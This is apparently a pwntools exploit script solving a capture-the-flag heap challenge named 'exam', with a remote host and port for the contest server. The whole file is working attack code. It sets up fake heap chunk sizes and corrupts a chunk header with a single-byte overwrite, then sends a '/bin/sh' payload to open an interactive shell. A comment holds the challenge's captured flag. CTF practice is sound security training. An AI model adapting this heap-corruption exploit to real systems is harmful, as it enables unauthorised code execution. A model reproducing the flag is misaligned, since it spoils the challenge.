from pwn import *
import sys
from time import time
import ctypes

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./exam"
LIBC = "../heapsofprint/libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level = 'debug'

# FLAG{wh0_n33d5_m4th_when_ch34t1ng_1s_4n_0pt10n}

def recvmenu(conn):
    conn.recvuntil("exam\n> ")

def addsum(conn, cntnt):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvline()
    conn.send(cntnt)

def remsum(conn, idx):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvline()
    conn.sendline(str(idx))

def mkcrib(conn):
    recvmenu(conn)
    conn.sendline("4")

def exam(conn, idx):
    recvmenu(conn)
    conn.sendline("6")
    conn.recvline()
    conn.sendline(str(idx))

def exploit(conn, elf, libc, local):
    addsum(conn, "A"*10 + "\n")
    addsum(conn, "B"*10 + "\n")

    payload = ""
    payload += (p64(0x80) + p64(0xc0)) * (0x40 / 16)
    addsum(conn, payload + "\n")

    remsum(conn, 0)
    remsum(conn, 1)

    payload = ""
    payload += "A"*0x80
    payload += "\xc1"
    addsum(conn, payload)

    mkcrib(conn)

    addsum(conn, "Z"*88 + "" + "ITSMAGIC/bin/sh\n")
    exam(conn, 2)

    conn.interactive()
    conn.close()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("flatearth.fluxfingers.net", 1745)
            r = remote(H, P)
            libc = ELF(LIBC)
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC)
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC)
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC)
        pause()
        exploit(r, elf, libc, local=True)
